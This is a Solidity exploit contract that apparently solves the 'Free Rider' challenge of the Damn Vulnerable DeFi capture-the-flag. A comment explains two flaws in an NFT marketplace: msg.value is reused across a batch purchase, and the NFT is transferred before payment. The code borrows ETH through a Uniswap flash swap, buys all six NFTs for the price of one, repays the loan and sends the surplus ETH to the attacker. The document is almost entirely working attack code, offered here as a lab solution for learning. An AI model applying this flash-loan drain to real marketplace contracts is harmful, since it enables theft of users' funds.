// SPDX-License-Identifier: MIT

pragma solidity ^0.6.6;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";

interface WETH9FreeRider {
    function withdraw(uint256 amtToWithdraw) external;

    function deposit() external payable;

    function transfer(address, uint256) external returns (bool);

    function balanceOf(address) external returns (uint256);
}

interface NFTMarketplaceFreeRider {
    function buyMany(uint256[] calldata tokenIds) external payable;

    function token() external returns (address);
}

interface DamnValuableNFTFreeRider {
    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId
    ) external;

    function ownerOf(uint256) external returns (address);
}

contract YouEffingBellend is IUniswapV2Callee {

    /**
    The Marketplace contract has 2 vulnerabilities:

    1. For chaining multiple token purchases, it executes an internal function that transfers the tokens individually (one at a time) BUT checks the same `msg.value` (remains constant throughout a transaction) each time.
    2. It transfers the NFT to buyer first, then tries to send the selling price to the owner. However, since the NFT gets transferred first, the buyer is the new owner, and hence, all selling price actually goes to them, 6 times! (for the price of one, due to #1 above)

    Chaining these vulnerabilities, the attack is simple:

    1. Take flash swap for ETH from Uniswap
    2. Use 15 ETH and buy all 6 NFTs (using vuln #1)
    3. Transfer all purchased NFTs to buyer contract
    4. Return back 15 ETH to Uniswap pair contract (plus fees)
    5. Transfer all left ETH (from vuln #2) to attacker, because, why not?
    6. Profit !!
     */

    function heck(
        IUniswapV2Pair _pair,
        address _wethAddr,
        address _nftMarketplaceAddr,
        address _buyerContractAddr
    ) external {
        // 1. Do flash swap to get more than 15 ETH
        uint256 loanAmt = 16 ether;
        bytes memory data = abi.encode(
            _wethAddr,
            _nftMarketplaceAddr,
            _buyerContractAddr,
            msg.sender
        );

        uint256 amount0Out = _pair.token0() == _wethAddr ? loanAmt : 0;
        uint256 amount1Out = amount0Out == 0 ? loanAmt : 0;
        _pair.swap(amount0Out, amount1Out, address(this), data);
    }

    function uniswapV2Call(
        address _sender,
        uint256 _amount0,
        uint256 _amount1,
        bytes calldata _data
    ) external override {
        (
            address wethAddr,
            address nftMarketplaceAddr,
            address buyerContractAddr,
            address attackerAddr
        ) = abi.decode(_data, (address, address, address, address));

        // 2. Withdraw ETH in exchange for WETH
        WETH9FreeRider(wethAddr).withdraw(16 ether);

        // 3. "Buy" all NFTs
        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }
        NFTMarketplaceFreeRider(nftMarketplaceAddr).buyMany{value: 15 ether}(
            tokenIds
        );

        // 4. Transfer ownership to buyer
        DamnValuableNFTFreeRider nftContract = DamnValuableNFTFreeRider(
            NFTMarketplaceFreeRider(nftMarketplaceAddr).token()
        );
        for (uint256 i = 0; i < 6; i++) {
            nftContract.safeTransferFrom(address(this), buyerContractAddr, i);
            require(
                nftContract.ownerOf(i) == buyerContractAddr,
                "NFT TRANSFER TO BUYER FAILED"
            );
        }

        // 5. Complete flash swap
        uint256 amtWETHToPayBack = 16 ether + ((4 * 16 ether) / 1000);
        WETH9FreeRider(wethAddr).deposit{value: amtWETHToPayBack}();
        WETH9FreeRider(wethAddr).transfer(msg.sender, amtWETHToPayBack);

        // 6. Transfer remaining ETH to attacker (miscalculation from NFT Contract)
        uint256 attackerEarning = address(this).balance;
        (bool success, ) = attackerAddr.call{value: attackerEarning}("");
        require(success, "TX TO ATTACKER FAILED");
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external returns (bytes4) {
        return this.onERC721Received.selector;
    }

    receive() external payable {}
}
